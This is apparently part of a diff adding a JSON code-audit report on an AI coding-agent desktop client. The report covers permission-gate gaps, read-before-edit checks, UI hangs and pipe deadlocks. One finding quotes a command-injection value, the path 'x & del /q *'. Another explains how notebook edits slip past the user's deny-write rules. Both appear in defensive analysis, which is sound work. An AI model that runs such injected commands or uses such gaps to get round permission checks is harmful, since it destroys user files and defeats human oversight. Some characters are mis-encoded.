+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  279,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "Scope switch (AgentToolService.cs:277-283): `ToolType.WriteFile or ToolType.EditFile or ToolType.MultiEdit or ToolType.CreateDirectory =\u003e \"write\", ... _ =\u003e \"execute\"` โ€” NotebookEdit falls into `_`. Resource resolution (line 276): `call.GetArg(\"path\", call.GetArg(\"command\", call.ToolName))` โ€” ExecuteNotebookEdit reads `notebook_path` (line 3429: `call.GetArg(\"notebook_path\", call.GetArg(\"path\"))`), so when the model passes notebook_path the permission resource degrades to the literal string \"notebook_edit\". CheckReadBeforeEdit is only called from ExecuteWriteFile/ExecuteEditFile/ExecuteMultiEdit (lines 1243/1275/1337) โ€” ExecuteNotebookEdit (3427) writes the .ipynb with no read-before-edit or stale-mtime check. The hex section comment (3673) claims \"hex_patch and hex_open are gated by the standard permission system (write scope)\" but they also fall to `_ =\u003e \"execute\"`.",
+                             "scenario":  "User adds rule `deny write **/*.ipynb` (or `deny write /src/**`) expecting all file mutations blocked โ€” notebook_edit sails past because its scope is \u0027execute\u0027 and its resource is the tool name, not a path; the rule never matches. Default-Ask still prompts, but a user who allow-listed \u0027execute: notebook_edit\u0027 once has permanently un-gated writes to ANY notebook path. Separately, notebook_edit can overwrite a notebook the model never read, the exact stale-write bug EnforceReadBeforeEdit was built to stop for write_file/edit_file.",
+                             "fix":  "In the scope switch add `ToolType.NotebookEdit or ToolType.HexPatch =\u003e \"write\"`, and for resource resolution use `call.GetArg(\"notebook_path\", call.GetArg(\"path\", ...))`. In ExecuteNotebookEdit, call CheckReadBeforeEdit(call, notebookPath) before writing and _fileSystem.MarkKnown(notebookPath) after, mirroring ExecuteWriteFile."
+                         },
+                         {
+                             "title":  "Write-validation warning path rebuilds ToolResult and drops Diff/FilePath/Error โ€” UI loses the inline diff exactly when a warning fires",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1895,
+                             "severity":  "UX",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "toolResult = new ToolResult { ToolName = toolResult.ToolName, Type = toolResult.Type, Success = true, Output = toolResult.Output + $\"\\nโ  Validation: {writeValidation}\", Summary = toolResult.Summary + \" (with warnings)\" }; โ€” the replacement object omits Diff, FilePath, Arguments (ExecuteWriteFile/EditFile set Diff and FilePath at AgentToolService.cs:1258-1259/1321-1322).",
+                             "scenario":  "Model edits a file; the edit succeeds but ValidateToolWrite returns a brace-balance warning. The rebuilt ToolResult reaches OnToolExecuted with Diff=null, so the chat renders the tool action WITHOUT the colorized inline diff (and without FilePath for click-through) โ€” precisely on the edits that most deserve user scrutiny.",
+                             "fix":  "Copy the remaining fields in the rebuild: Diff = toolResult.Diff, FilePath = toolResult.FilePath, Arguments = toolResult.Arguments, Error = toolResult.Error โ€” or mutate Output/Summary on the existing instance instead of constructing a new one."
+                         },
+                         {
+                             "title":  "AppSettings round-trip silently drops unknown JSON fields (no JsonExtensionData) โ€” forward/backward-compat data loss on every Save",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\SettingsService.cs",
+                             "line":  119,
+                             "severity":  "MINOR",
+                             "kind":  "silent-failure",
+                             "evidence":  "_settings = JsonSerializer.Deserialize\u003cAppSettings\u003e(json, JsonOptions) ?? new AppSettings(); ... Save(): string json = JsonSerializer.Serialize(clone, JsonOptions); โ€” grep for JsonExtensionData in AppSettings.cs returns no matches, so any property not declared on the running binary\u0027s AppSettings is discarded at Load and absent from the next Save.",
+                             "scenario":  "User runs a newer build that wrote the 11 new lever fields, then reverts to the previous build (or a portable copy): the old binary loads settings.json, drops every unrecognized field, and the first Save() permanently erases the newer toggles\u0027 values (EscalationEnabled, MicrocompactKeepRecentTurns, ...). Same for any hand-added keys. Note the rest of item 7 verified clean: all 11 toggle defaults are sane (EscalationEnabled=false, AutonomousLoopEnabled=false, SessionMemoryEnabled=false opt-in, AutoVerify/Microcompact/RBE=true at AppSettings.cs:67-179) and Load() runs in the SettingsService constructor before any consumer reads a toggle, so no first-turn wrong-default exists.",
+                             "fix":  "Add `[JsonExtensionData] public Dictionary\u003cstring, JsonElement\u003e? ExtraFields { get; set; }` to AppSettings (and nested ProviderConfig/FeatureToggles) so unknown fields survive the loadโ’save round-trip."
+                         },
+                         {
+                             "title":  "Restored sessions lose inline diffs and tool arguments โ€” DiffLines/DiffStat/ToolArguments are never persisted",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\DatabaseService.cs",
+                             "line":  176,
+                             "severity":  "UX",
+                             "kind":  "silent-failure",
+                             "evidence":  "INSERT INTO messages (id, session_id, role, content, timestamp, tool_name, tool_summary, tool_output, tool_success, has_error, sort_order) โ€” ChatMessage.DiffLines/DiffStat (ChatMessage.cs:117-119), ToolArguments (108) and ToolElapsedTime have no columns and are not round-tripped; LoadSession (DatabaseService.cs:267-278) rebuilds messages without them.",
+                             "scenario":  "User approves several edits (each rendered with a colorized diff), closes the app, reopens the session: every ToolAction row renders without its diff or input summary โ€” the audit trail of WHAT was changed is gone, leaving only \u0027Edited X (2 changes)\u0027.",
+                             "fix":  "Add diff_json (serialized DiffLines+DiffStat) and tool_arguments TEXT columns in a schema v3 migration (same idempotent ALTER pattern as v2 at line 112-124), persist and restore them in SaveSession/LoadSession."
+                         },
+                         {
+                             "title":  "VERIFIED FIXED โ€” unknown tool name no longer falls back to RunCommand in either dispatch path",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  136,
+                             "severity":  "MINOR",
+                             "kind":  "wiring-gap",
+                             "evidence":  "Legacy parse: `var toolType = ResolveToolType(toolName); if (toolType == null) continue;` (135-136) with corrective feedback via GetUnknownActionNames (170-182) + CodeAgentService.cs:1239-1258 \u0027did you mean\u0027 nudge. Native loop: CodeAgentService.cs:1864-1873 โ€” \"// NEVER silently fall back to RunCommand: a misspelled tool name must not become a shell exec\" then `throw new InvalidOperationException($\"Unknown tool \u0027{toolCall.Name}\u0027 ...\")`. ToolCallSalvage.ExtractFromText only accepts names passing isKnownTool (ToolCallSalvage.cs:154). Residual `?? ToolType.RunCommand` at CodeAgentService.cs:1833 is used ONLY for read/write concurrency partitioning (unknown โ’ treated as write โ’ sequential), never for execution.",
+                             "scenario":  "Model emits [ACTION:delete_everything] or native tool_use \u0027rm_rf\u0027 โ€” legacy path drops it and feeds back a correction; native path returns an error tool_result. No shell execution occurs. Risk #1 closed.",
+                             "fix":  "No action needed โ€” verified intact at commit ee066da."
+                         },
+                         {
+                             "title":  "VERIFIED FIXED โ€” WriteFile IS gated by read-before-edit + stale-mtime guard (not just EditFile)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  1243,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "ExecuteWriteFile line 1243: `var rbe = CheckReadBeforeEdit(call, path); if (rbe != null) return rbe;` (same gate in EditFile:1275, MultiEdit:1337). FileSystemService.CheckCanModify (204-216): blocks an existing file never read this session AND a file whose (mtime,size) snapshot changed since last read: \"\u0027{relativePath}\u0027 changed on disk since you last read it โ€” read_file it again before editing\". New files allowed (line 208). read_file marks snapshots (AgentToolService.cs:1160,1173); writes re-mark (1248). _readSnapshots is a ConcurrentDictionary cleared on project switch (FileSystemService.cs:20,33). Gated by EnforceReadBeforeEdit, default true (AppSettings.cs:67). Plus the diff-preview permission prompt (TryComputePreviewDiff, 1195-1200) shows the user the exact overwrite before approval.",
+                             "scenario":  "Model calls write_file on an existing file with uncommitted user changes it never read โ’ blocked with an actionable message; if the user edited the file in an IDE between the agent\u0027s read and write, the mtime/size mismatch blocks the stale overwrite. Risk #2 closed for write_file/edit_file/multi_edit (see separate finding for the notebook_edit gap).",
+                             "fix":  "No action needed โ€” verified intact. (The remaining hole is notebook_edit, reported separately.)"
+                         },
+                         {
+                             "title":  "VERIFIED FIXED โ€” clone-before-truncate intact in both loops; originals never mutated",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1421,
+                             "severity":  "MINOR",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "Legacy: FormatToolResultsWithBudget (1418-1434) โ€” \"// Truncate individual results WITHOUT mutating originals\" builds `new ToolResult {...}` for oversized outputs. Native loop: truncation operates on the local string `resultContent` (1910-1916), the full ToolResult goes untouched to OnToolExecuted (1907). Microcompact also clones: \"Returns a shallow-copied list; the caller\u0027s list is not mutated\" (2141-2142) and CompactBlock builds new ContentBlocks (2189-2195).",
+                             "scenario":  "A 200KB grep result is truncated for the model but the UI/session history retains the full output; a later microcompact pass cannot corrupt the canonical nativeMessages. Risk #3 closed.",
+                             "fix":  "No action needed โ€” verified intact."
+                         },
+                         {
+                             "title":  "VERIFIED FIXED โ€” HookService SanitizeShellArg present and pipes read concurrently",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\HookService.cs",
+                             "line":  294,
+                             "severity":  "MINOR",
+                             "kind":  "hang",
+                             "evidence":  "Concurrent reads (293-298): \"// Read stdout/stderr concurrently to avoid pipe deadlock\" โ€” var stdoutTask = proc.StandardOutput.ReadToEndAsync(cts.Token); var stderrTask = ...; await proc.WaitForExitAsync(cts.Token); with per-hook timeout (cts.CancelAfter(hook.TimeoutMs), default 10s) and Kill(true) on cancel (309). SanitizeShellArg (433-456) strips backtick/$()/$/%/^/newlines FIRST, then escapes \" \u0026 | \u003c \u003e with ^ and removes \u0027;\u0027 โ€” strip-then-escape order is correct so injected text can\u0027t smuggle a fresh caret.",
+                             "scenario":  "PreToolUse hook template `echo {path}` with a malicious path `x \u0026 del /q *` substitutes to `x ^\u0026 del /q *` โ’ cmd treats \u0026 as literal; a hook that prints 100KB no longer deadlocks the agent loop. Risk #4 closed.",
+                             "fix":  "No action needed โ€” verified intact."
+                         },
+                         {
+                             "title":  "VERIFIED โ€” permission gate covers every tool dispatched through ExecuteToolAsync with default-Ask; only RunVerifyBuildAsync bypasses (reported separately)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  256,
+                             "severity":  "MINOR",
+                             "kind":  "wiring-gap",
+                             "evidence":  "ExecuteToolAsync runs the gate (257-300) BEFORE the dispatch switch (307) for all 46+ tool types including run_tests/run_build/powershell/MCP โ€” `var perm = _permissionService.CheckPermission(resource, scope, call.ToolName); if (perm == PermAction.Deny) return Fail(...); if (perm == PermAction.Ask) { ... OnPermissionRequired ... }`. PermissionService.CheckPermission ends `return PermAction.Ask;` (line 136) โ€” default-deny-to-prompt, not default-allow. Null-handler = deny (ChatViewModel.cs:441 \"headless / no UI โ’ fail safe (deny)\"). Stop-button cancels a pending prompt as DENIED so the loop can\u0027t park forever (ChatViewModel.cs:462-471). Native loop reaches tools only via _agentToolService.ExecuteToolAsync (CodeAgentService.cs:1887). run_build/run_tests inner calls to ExecuteRunCommandAsync skip a second gate but the user already approved the outer run_build/run_tests call.",
+                             "scenario":  "Every model-initiated WRITE/EXEC tool (including new run_tests) produces Deny/Ask/Allow resolution before execution; misconfigured empty rule set degrades to prompting, not allowing. Risk #5 verified except the two live gaps filed separately (RunVerifyBuildAsync bypass โ€” CRITICAL; notebook_edit scope mismatch โ€” LOGIC).",
+                             "fix":  "No action needed on the main gate. Address the two separately-filed gaps."
+                         },
+                         {
+                             "title":  "VERIFIED FIXED โ€” session restore cannot break API alternation; PermissionRequest rows skipped on save",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\DatabaseService.cs",
+                             "line":  172,
+                             "severity":  "MINOR",
+                             "kind":  "crash",
+                             "evidence":  "SaveSession: `if (msg.Role == MessageRole.PermissionRequest) continue;` (172) with the rationale comment at 169-171 (PermissionCallback Action\u003cbool\u003e can never be persisted; reloaded prompt would be a dead button). Restore path: ExecuteNativeToolLoopAsync rebuilds history as PLAIN TEXT blocks only โ€” `nMsg.Content.Add(new ContentBlock { Type = \"text\", Text = msg.Content })` (CodeAgentService.cs:1586-1591), so persisted mid-turn tool actions can never resurface as orphaned tool_use blocks; EnsureAlternatingRoles (2239-2272) merges consecutive same-role messages and prepends a user message if history starts with assistant. tool_use/tool_result pairing is additionally guaranteed within a live turn: \"everything below runs under a try that ALWAYS emits a result\" (CodeAgentService.cs:1842-1846).",
+                             "scenario":  "App killed mid-agentic-turn after an assistant tool_use; on relaunch the session restores as text-only history, the next API request has strictly alternating roles, Anthropic accepts it. A saved-then-restored permission prompt no longer renders as an unanswerable dead button. Risk #8 closed (diff-payload persistence loss filed separately as UX).",
+                             "fix":  "No action needed โ€” verified intact."
+                         }
+                     ]
+    },
+    {
+        "area":  "hang-deadlock",
+        "findings":  [
+                         {
+                             "title":  "SSE stream loops block on StreamReader.EndOfStream โ€” synchronous, uncancellable network read on the UI thread (all 5 streaming providers)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  393,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "LlamaServerProvider.cs:393-396:\n    while (!reader.EndOfStream)\n    {\n        ct.ThrowIfCancellationRequested();\n        var line = await reader.ReadLineAsync(ct);\nSame pattern at OllamaProvider.cs:220, AnthropicProvider.cs:246 and 496 (`while (!streamEnded \u0026\u0026 !reader.EndOfStream)`), OpenAiProvider.cs:113, GeminiProvider.cs:202. `StreamReader.EndOfStream` performs a SYNCHRONOUS blocking Read() when its buffer is empty (this is analyzer rule CA2024: \u0027Do not use StreamReader.EndOfStream in async methods\u0027). It takes no CancellationToken, and HttpClient.Timeout does not cover body reads after HttpCompletionOption.ResponseHeadersRead. The consumer runs on the UI thread: ChatViewModel.cs:2156 `await foreach (var token in _agentService.ChatStreamAsync(history, input, ct))` and ChatViewModel.cs:1743 `await _agentService.ExecuteAgenticAsync(...)` โ€” the whole project has exactly ONE ConfigureAwait(false) (SubAgentService), so every async-iterator continuation resumes on the WPF dispatcher.",
+                             "scenario":  "User chats with a local model via llama-server. During prompt processing (10s-minutes on long context / partial GPU offload) the server sends no SSE bytes, so EndOfStream\u0027s sync Read blocks THE UI THREAD โ€” window shows \u0027(Not Responding)\u0027, the Stop button can\u0027t even be clicked. If llama-server wedges (CUDA stuck, process suspended) while keeping the socket open, the block is permanent: the idle-timeout CTS (CodeAgentService.cs:2380/1658) fires its timer but cancellation can only be observed at the next await, which never comes โ€” nothing aborts the connection. Even on the happy path the UI stutters/freezes between every network chunk during streaming. This is the literal \u0027เธกเธฑเธเธเนเธฒเธ\u0027 report.",
+                             "fix":  "Two-part fix: (1) Replace every `while (!reader.EndOfStream) { var line = await reader.ReadLineAsync(ct); ... }` with `string? line; while ((line = await reader.ReadLineAsync(ct)) != null) { ... }` โ€” ReadLineAsync(ct) returns null at EOF and is cancellable. Also register connection abort so the idle timeout actually bites: `using var abortReg = ct.Register(() =\u003e response.Dispose());` before the read loop. (2) Stop running provider iterators on the dispatcher: in ChatViewModel wrap the consumption in Task.Run (the code already marshals all UI updates via App.Current?.Dispatcher.Invoke, so it is background-safe by design)."
+                         },
+                         {
+                             "title":  "ExecuteRunCommandAsync awaits WaitForExitAsync BEFORE reading stdout/stderr โ€” classic pipe-buffer deadlock; run_build/run_tests/auto-verify freeze for the full timeout then falsely report \u0027timed out\u0027",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  1630,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "AgentToolService.cs:1627-1632:\n    string stdout, stderr;\n    try\n    {\n        await process.WaitForExitAsync(cts.Token);\n        stdout = await process.StandardOutput.ReadToEndAsync(cts.Token);\n        stderr = await process.StandardError.ReadToEndAsync(cts.Token);\nBoth pipes are redirected (lines 1612-1613) but nothing drains them until the process exits. A child that writes more than the ~4KB anonymous-pipe buffer blocks on write and never exits โ’ WaitForExitAsync only returns when cts fires โ’ Kill + `return Fail(call, $\"Command timed out ({timeoutMs / 1000}s limit)\")`. Compare the CORRECT concurrent pattern the codebase itself uses elsewhere: ExecutePowerShellAsync (AgentToolService.cs:3629-3631), HookService.cs:294-296, GitService.cs:444-446 (\u0027If we await WaitForExitAsync first, the process may block filling the pipe buffer\u0027). Reached by run_build (ExecuteRunBuildAsync:1461, timeout_ms=180000), run_tests (1482, 300000), and RunVerifyBuildAsync:1504 โ€” and AutoVerifyAfterEditEnabled defaults TRUE (AppSettings.cs:133), so it fires after every successful edit turn (CodeAgentService.cs:1958-1969).",
+                             "scenario":  "Agent edits a file โ’ auto-verify runs `dotnet build`. dotnet build output easily exceeds 4KB, so the child stalls writing, WaitForExitAsync never completes, and the chat sits on \u0027Auto-verifying build after edit...\u0027 for a full 180 seconds, then the build is killed and reported as FAILED (\u0027timed out\u0027). The failure note is fed back to the model, which \u0027fixes\u0027 nothing and builds again โ’ another 3-minute freeze, repeating up to MaxAutoVerifies=6 (~18 minutes of apparent hang per task). Any run_command with verbose output (npm install, git log, dir /s) hits the same 30s stall + false timeout.",
+                             "fix":  "Reorder to the concurrent-read pattern already used three other places in this codebase:\n    var stdoutTask = process.StandardOutput.ReadToEndAsync(cts.Token);\n    var stderrTask = process.StandardError.ReadToEndAsync(cts.Token);\n    await process.WaitForExitAsync(cts.Token);\n    stdout = await stdoutTask; stderr = await stderrTask;"
+                         },
+                         {
+                             "title":  "Entire agentic loop โ€” including synchronous tool implementations (repo-wide content search, file reads, diff preview) โ€” executes on the WPF UI thread",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\ViewModels\\ChatViewModel.cs",
+                             "line":  1743,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "ChatViewModel.cs:1743: `var result = await _agentService.ExecuteAgenticAsync(history, input, progress, ct);` โ€” invoked from SendMessage on the dispatcher (AsyncRelayCommand.Execute, ViewModelBase.cs:85) with no Task.Run, and grep shows ConfigureAwait(false) appears exactly once in the whole app (SubAgentService.cs). So every continuation of the loop runs on the UI thread, where ExecuteToolAsync dispatches SYNCHRONOUS tool bodies directly: AgentToolService.cs:310 `ToolType.ReadFile =\u003e ExecuteReadFile(call),` :318 `ToolType.SearchContent =\u003e ExecuteSearchContent(call),` (line 1563 `var results = _fileSystem.SearchContent(query, path, filePattern);` โ€” a full repo scan), :373 GlobSearch, :374 Grep, plus TryComputePreviewDiff in the permission gate. \u0027Run read-only tools in parallel\u0027 (CodeAgentService.cs:1947 Task.WhenAll) is also serialized onto the same single thread.",
+                             "scenario":  "Agent calls search_content/grep over a large project, or read_file on a big file: the WPF window freezes for the entire scan (seconds to tens of seconds, \u0027(Not Responding)\u0027), Stop is unclickable, the elapsed-timer status stops updating. Combined with finding #1 the user experiences the whole agentic turn as one long UI freeze. Also makes the parallel read-tool execution a no-op.",
+                             "fix":  "In ChatViewModel, run the loop off the dispatcher: `var result = await Task.Run(() =\u003e _agentService.ExecuteAgenticAsync(history, input, progress, ct));` (same for RunStreaming/RunWithAutoExecution/RunAutonomous). This is safe because every UI touch inside the loop and its event handlers already marshals through App.Current?.Dispatcher.Invoke/BeginInvoke (OnStreamToken ChatViewModel.cs:1667, OnToolStarting:1860, OnToolExecuted:1906, permission prompt:473). Alternatively/additionally wrap heavy sync tools (SearchContent, glob, grep, read) in Task.Run inside ExecuteToolAsync."
+                         },
+                         {
+                             "title":  "In-process LLamaSharp inference (CPU path) runs native prefill/decode on the consuming UI thread โ€” window frozen for the whole generation",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\LlamaInferenceService.cs",
+                             "line":  478,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "LlamaInferenceService.cs:478: `await foreach (var text in executor.InferAsync(prompt.ToString(), inferenceParams, ct))` inside `public async IAsyncEnumerable\u003cstring\u003e ChatAsync(...)` (line 358). LLamaSharp\u0027s InteractiveExecutor.InferAsync performs llama_decode synchronously inside MoveNextAsync on the caller\u0027s thread; this iterator is consumed via CodeAgentService.ChatStreamAsync โ’ ChatViewModel.RunStreaming (ChatViewModel.cs:2156) on the UI thread with no Task.Run/Channel offload anywhere in the chain (only Task.Run in this file is for model LOADING, line 211).",
+                             "scenario":  "User on the in-proc CPU path (no llama-server.exe found) sends a message with a long history: the entire prompt prefill (often 10-60s on CPU) executes synchronously on the dispatcher before the first token โ€” total UI freeze, \u0027(Not Responding)\u0027, Stop unreachable. Each subsequent token decode also blocks the UI between yields, so the app stays frozen for the whole reply.",
+                             "fix":  "Pump the inference on a background thread into a Channel\u003cstring\u003e (Task.Run producer writing channel; ChatAsync yields from channel.Reader.ReadAllAsync(ct)), or fix at the consumer as in finding #3 (Task.Run around the whole send pipeline), which resolves this path too."
+                         },
+                         {
+                             "title":  "Local native tool loop: 120s idle timeout never resets because LlamaServerProvider.ChatWithToolsAsync is non-streaming and never calls onTextDelta โ€” long local generations always time out, then auto-retry repeats the stall",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  490,
+                             "severity":  "LOGIC",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "LlamaServerProvider.cs:490: `[\"stream\"] = false,` โ€” and the `onTextDelta` parameter (line 473) is never invoked anywhere in the method body. The loop\u0027s idle window only resets inside that callback: CodeAgentService.cs:1666-1668 `onTextDelta: token =\u003e { if (timeoutSec \u003e 0) callCts.CancelAfter(TimeSpan.FromSeconds(timeoutSec)); ... }` with `InteractiveRequestTimeoutSeconds` defaulting to 120 (AppSettings.cs:64). So for the local native path the \u0027idle\u0027 timeout is actually a hard cap on the ENTIRE generation. On timeout, CodeAgentService.cs:1678 throws TimeoutException, which ChatViewModel.cs:1532-1534 classifies as retryable and re-sends up to 3 times (each retry re-processes the full prompt).",
+                             "scenario":  "User loads a 14B-27B GGUF (the catalog now ships Gemma 27B / multi-GPU tensor-split rigs) and gives an agentic task with a 16k context. Prompt processing + a long tool-planning response takes \u003e120s โ’ request is cancelled at exactly 120s, \u0027Request timed out\u0027 โ’ auto-retry 1..3 each hitting the same wall โ’ ~8 minutes of \u0027Working...\u0027 ending in an error, while llama-server was healthily generating the whole time. Looks exactly like \u0027เธเนเธฒเธ + เธเธฑเธ\u0027 on the priority-#1 local path.",
+                             "fix":  "Use stream=true for the local tool path and accumulate OpenAI tool_call deltas from the SSE stream, invoking onTextDelta per chunk so the idle window resets (llama-server supports streamed tool calls with --jinja). Cheaper interim fix: in ExecuteNativeToolLoopAsync, skip/raise the CancelAfter cap when the active provider is a non-streaming local provider, or poll llama-server\u0027s /slots busy state as the liveness signal."
+                         },
+                         {
+                             "title":  "Plain-chat streaming path has no idle/stall timeout at all (agentic paths have one, chat mode doesn\u0027t)",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  1011,
+                             "severity":  "LOGIC",
+                             "kind":  "hang",
+                             "evidence":  "CodeAgentService.cs:1003-1015 ChatStreamAsync:\n    await foreach (var token in _providerManager.ActiveProvider.ChatAsync(history, userMessage, systemPrompt, ct))\n        yield return token;\nNo linked CTS / CancelAfter here, and none in the consumer RunStreaming (ChatViewModel.cs:2156). Contrast with the agentic paths which both wrap calls in an idle-reset CTS (CodeAgentService.cs:2378-2380 and 1654-1658).",
+                             "scenario":  "Non-agentic chat (AgenticMode off, or no project open): provider accepts the request then stalls mid-stream (Ollama model eviction, llama-server wedge, network drop without RST). The UI shows \u0027Generating...\u0027 forever; the only escape is the Stop button โ€” which, per finding #1, cannot interrupt the sync EndOfStream read anyway. IsGenerating stays true, so the user can\u0027t send anything: app effectively hung until restart.",
+                             "fix":  "Wrap the await-foreach in ChatStreamAsync (or RunStreaming) with the same pattern as GenerateWithRetryAsync: linked CTS + CancelAfter(InteractiveRequestTimeoutSeconds), reset on every token, converting a stalled stream into a clean retryable error. Depends on finding #1\u0027s fix for the cancellation to actually interrupt the read."
+                         },
+                         {
+                             "title":  "ask_user tool is advertised to the model but has no UI handler โ€” OnAskUserQuestion has zero subscribers, so every call fails",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\AgentToolService.cs",
+                             "line":  3334,
+                             "severity":  "LOGIC",
+                             "kind":  "wiring-gap",
+                             "evidence":  "AgentToolService.cs:3334: `public event Func\u003cstring, List\u003cstring\u003e, Task\u003cstring\u003e\u003e? OnAskUserQuestion;` โ€” project-wide grep finds only the declaration, the null-check (3347 `if (OnAskUserQuestion == null) return Fail(call, \"AskUser not available โ€” no UI handler connected\");`) and the invoke (3352). ChatViewModel wires OnPermissionRequired (ChatViewModel.cs:438) but never OnAskUserQuestion. The tool is still dispatched (line 375) and exposed via schemas/name resolution (2442).",
+                             "scenario":  "The model decides to ask the user a clarifying question (the system prompt and tool catalog tell it ask_user exists). The call instantly errors \u0027AskUser not available โ€” no UI handler connected\u0027; the model either retries (burning turns toward the iteration budget) or guesses, producing wrong work the user perceives as \u0027เธเธฑเธ\u0027.",
+                             "fix":  "Subscribe in ChatViewModel using the same inline TaskCompletionSource pattern as OnPermissionRequired (render a question bubble with option buttons, resolve the TCS on click, and register on _cts.Token to resolve with a \u0027cancelled\u0027 answer if the user hits Stop so the loop can\u0027t park forever). Alternatively, remove ask_user from BuildNativeToolSchemas/the prompt until the handler exists."
+                         }
+                     ]
+    },
+    {
+        "area":  "ux-wiring",
+        "findings":  [
+                         {
+                             "title":  "Pending permission prompt is destroyed by LoadSession/NewSession โ€” agent loop awaits forever, IsGenerating stuck",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\ViewModels\\ChatViewModel.cs",
+                             "line":  823,
+                             "severity":  "CRITICAL",
+                             "kind":  "hang",
+                             "evidence":  "LoadSession: \"Messages.Clear();\" (line 823) and NewSession: \"Messages.Clear();\" (line 1157) โ€” neither cancels _cts nor checks IsGenerating. The permission TCS (line 446: \"var tcs = new TaskCompletionSource\u003cbool\u003e(...)\") only resolves via prompt.PermissionCallback (the Allow/Deny buttons on the ChatMessage that was just removed from Messages) or via token.Register on _cts (line 462), which only fires on the Stop button.",
+                             "scenario":  "Agent asks \u0027Allow edit_file to write: X?\u0027. User clicks a different session in the sidebar (or /new) instead of answering. Messages.Clear() removes the prompt bubble; nobody can ever click Allow/Deny; _cts is never cancelled. AgentToolService.ExecuteToolAsync awaits OnPermissionRequired forever, SendMessage never reaches finally, IsGenerating stays true, and SendMessage() returns early on every future send (line 1364 \u0027if (... || IsGenerating) return\u0027). App is permanently mute until restart โ€” exactly the user\u0027s \"เธกเธฑเธเธเนเธฒเธ\" report. Bonus bleed: any tool events from the stuck loop now append into the NEWLY loaded session\u0027s Messages.",
+                             "fix":  "In LoadSession and NewSession: if IsGenerating, either block the switch (\"Stop the current generation first\") or call StopGeneration() and await loop unwind before clearing Messages. Additionally, keep a reference to the open permission prompt and TrySetResult(false) on any session switch/clear. Also add a configurable timeout (e.g. 5 min โ’ auto-deny) on the permission TCS as a last-resort net."
+                         },
+                         {
+                             "title":  "120s idle timeout kills healthy local tool-loop turns: llama-server/Ollama native paths are non-streaming and never reset the idle window",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\Providers\\LlamaServerProvider.cs",
+                             "line":  490,
+                             "severity":  "CRITICAL",
+                             "kind":  "wrong-behavior",
+                             "evidence":  "LlamaServerProvider.ChatWithToolsAsync: \"[\\\"stream\\\"] = false,\" (line 490) and the body never invokes the onTextDelta parameter. Same in OllamaProvider.ChatWithToolsAsync (line 322 \u0027[\\\"stream\\\"] = false\u0027). But CodeAgentService.cs:1658 \u0027if (timeoutSec \u003e 0) callCts.CancelAfter(TimeSpan.FromSeconds(timeoutSec));\u0027 is only reset inside onTextDelta (line 1668) โ€” the comment claims \u0027the window resets on every streamed chunk, so a healthy (even slow) generation is never cut off\u0027, which is false on both local native tool paths.",
+                             "scenario":  "Local 12B model, 16k-token prompt (system prompt + tool schemas + history): prefill 60-90s plus a long write_file arguments generation at 10-20 tok/s easily exceeds InteractiveRequestTimeoutSeconds=120 total. callCts fires mid-generation โ’ TimeoutException \u0027the model did not respond\u0027 โ’ SendMessage\u0027s auto-retry re-sends the SAME oversized request 3 times (3s/6s/9s backoff), each dying at 120s โ€” ~6+ minutes of spinner then an error, while llama-server was healthily generating the whole time. User reads it as \u0027เธเนเธฒเธ/เธเธฑเธ\u0027. This silently breaks the #1-priority local path for every non-trivial edit.",
+                             "fix":  "Make the local ChatWithToolsAsync stream (llama-server supports stream:true with tool_calls deltas since b4xxx; accumulate tool_call fragments) and invoke onTextDelta per chunk; short-term fix: in CodeAgentService, when the provider is a non-streaming local one, scale the idle cap by prompt size or skip CancelAfter and rely on a much larger ceiling (e.g. 10 min) for local providers."
+                         },
+                         {
+                             "title":  "OnAgentStatus event has ZERO subscribers โ€” auto-verify, escalation, tool-call-salvage and compaction notices all fire into the void",
+                             "file":  "E:\\Code\\ClaudeClient\\CluadeX\\Services\\CodeAgentService.cs",
+                             "line":  595,
+                             "severity":  "CRITICAL",
+                             "kind":  "wiring-gap",
+                             "evidence":  "Declaration: \"public event Action\u003cstring\u003e? OnAgentStatus;\" (CodeAgentService.cs:595). grep for \u0027OnAgentStatus +=\u0027 across the entire solution returns NO matches. Statuses routed ONLY through it (no progress.Report twin): line 1966 \u0027Auto-verifying build after edit...\u0027, line 2025-2027 \u0027โคด Escalating to {elabel} (local model stuck)...\u0027, line 1775 \u0027Recovered tool call from text...\u0027, line 1687 \u0027Context overflow โ€” compacting...\u0027, line 1732 \u0027Response truncated โ€” requesting continuation...\u0027.",
